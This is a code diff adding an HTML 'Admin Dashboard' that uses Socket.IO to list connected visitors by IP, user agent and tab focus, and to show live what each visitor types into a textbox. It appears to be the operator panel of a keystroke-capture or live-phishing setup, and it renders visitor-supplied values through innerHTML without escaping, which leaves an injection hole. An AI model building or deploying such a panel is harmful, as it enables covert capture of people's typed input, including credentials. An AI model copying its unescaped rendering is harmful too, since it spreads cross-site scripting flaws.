@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Dashboard</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            flex-direction: column;
+        }
+        li:last-child {
+            border-bottom: none;
+        }
+        .user-info {
+            margin-bottom: 10px;
+        }
+        .user-actions {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        button {
+            padding: 5px 10px;
+            margin-left: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button.redirect {
+            background-color: #007bff;
+            color: white;
+        }
+        button.redirect:hover {
+            background-color: #0056b3;
+        }
+        input[type="text"] {
+            padding: 5px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .typing-data {
+            margin-top: 10px;
+            font-style: italic;
+            color: #555;
+        }
+        .typing-element {
+            margin-top: 5px;
+        }
+        .active {
+            color: green;
+        }
+        .inactive {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Admin Dashboard</h1>
+        <ul id="clientList"></ul>
+    </div>
+
+    <script type="text/javascript">
+        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port);
+
+        socket.on('update_admin', function(clients) {
+            console.log('Received update_admin event:', clients);
+
+            let clientList = document.getElementById('clientList');
+
+            let currentClientIds = new Set(Object.keys(clients));
+
+            for (var client_id in clients) {
+                var client = clients[client_id];
+                var status = client.tab_status === 'active' ? 'Active' : 'Tabbed Out';
+
+                let clientElement = document.getElementById(`client-${client_id}`);
+                if (clientElement) {
+                    let statusElement = clientElement.querySelector('.status');
+                    if (statusElement) {
+                        console.log(`Updating status for client ${client_id} to ${status}`);
+                        statusElement.textContent = `Status: ${status}`;
+                        statusElement.className = `status ${status === 'Active' ? 'active' : 'inactive'}`;
+                    } else {
+                        console.warn(`Status element for client ${client_id} not found.`);
+                    }
+                } else {
+                    console.log(`Adding new client ${client_id}`);
+                    let li = document.createElement('li');
+                    li.id = `client-${client_id}`;
+
+                    let userInfo = document.createElement('div');
+                    userInfo.className = 'user-info';
+                    userInfo.innerHTML = `
+                        <span><strong>IP:</strong> ${client.ip}</span>
+                        <span><strong>User Agent:</strong> ${client.user_agent}</span>
+                        <span class="status ${status === 'Active' ? 'active' : 'inactive'}"><strong>Status:</strong> ${status}</span>
+                    `;
+
+                    li.appendChild(userInfo);
+
+                    let typingData = document.createElement('div');
+                    typingData.className = 'typing-data';
+                    typingData.id = `typing-${client_id}`;
+                    typingData.innerHTML = `
+                        <div id="typing-${client_id}-input_textbox1" class="typing-element"><strong>Textbox 1:</strong> (No activity yet)</div>
+                    `;
+                    
+                    li.appendChild(typingData);
+                    clientList.appendChild(li);
+                }
+            }
+
+            clientList.querySelectorAll('li').forEach(function(item) {
+                const clientId = item.id.replace('client-', '');
+                if (!currentClientIds.has(clientId)) {
+                    console.log(`Removing disconnected client ${clientId}`);
+                    item.remove();
+                }
+            });
+        });
+
+        socket.on('update_typing', function(data) {
+            console.log('Received update_typing event:', data);
+            let typingElement = document.getElementById(`typing-${data.client_id}-${data.element}`);
+            if (typingElement) {
+                typingElement.innerHTML = `<strong>Textbox 1:</strong> ${data.value}`;
+            } else {
+                console.warn(`Typing element for client ${data.client_id} not found.`);
+            }
+        });
+    </script>
+</body>
+</html>
